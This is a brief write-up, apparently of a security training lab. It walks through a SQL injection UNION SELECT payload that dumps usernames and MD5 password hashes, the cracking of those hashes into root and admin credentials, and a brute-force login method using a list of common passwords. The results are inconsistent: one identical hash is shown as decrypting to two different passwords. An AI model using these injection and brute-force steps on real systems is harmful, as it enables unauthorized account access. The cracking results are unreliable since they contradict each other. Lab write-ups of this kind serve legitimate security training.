In the members sql injection we got to know all the DB tables . among them there was db_default tables wich contains some usernames and passwords

- 5 UNION SELECT username,password FROM Member_Brute_Force.db_default

root:3bf1114a986ba87ed28fc1b5884fc2f8       => md5 decrypt =>   root:dragon
admin:3bf1114a986ba87ed28fc1b5884fc2f8      => md5 decrypt =>   admin:shadow (these are the credentials that worked)



########Method2###########
The idea here is to get the right credentials using bruteforce by testing random passwords for admin username,  i used a list of 1000 most common passwords.
